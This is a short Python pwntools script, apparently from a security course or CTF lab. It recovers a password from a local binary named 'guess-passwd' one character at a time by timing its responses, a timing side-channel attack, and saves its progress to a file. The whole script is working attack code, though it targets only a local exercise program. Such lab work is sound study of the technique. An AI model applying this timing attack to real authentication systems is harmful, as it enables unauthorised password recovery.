#!/usr/bin/env python

from pwn import *
import time

limit = 62
i = 0

#run the program 19 times

f = open("output.txt", "r")
sofar = f.read()
#sofar = sofar[:-1]
print(sofar+";")

charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ012345    6789"

def find_greatest_time_char(pre_string):
    times = []
    for i in range(len(charset)):

        p = process("./guess-passwd")


        buf = pre_string + charset[i]

        # fixed by Yeongjin. Think about why this is required to measure
        # the time precisely.
        print(p.recv())

        p.sendline(buf)
        t1 = time.time()

        data = p.recv()


        t2 = time.time()
        time_diff = t2 - t1


        times.append((charset[i],time_diff))
    print(sorted(times,key=lambda x: x[1], reverse=True)[1])
    print(sorted(times,key=lambda x: x[1], reverse=True)[0])
    return sorted(times,key=lambda x: x[1], reverse=True)[0]


newletter = find_greatest_time_char(sofar)[0]
print(newletter+";")
f = open("output.txt", "w")
f.write(sofar + newletter)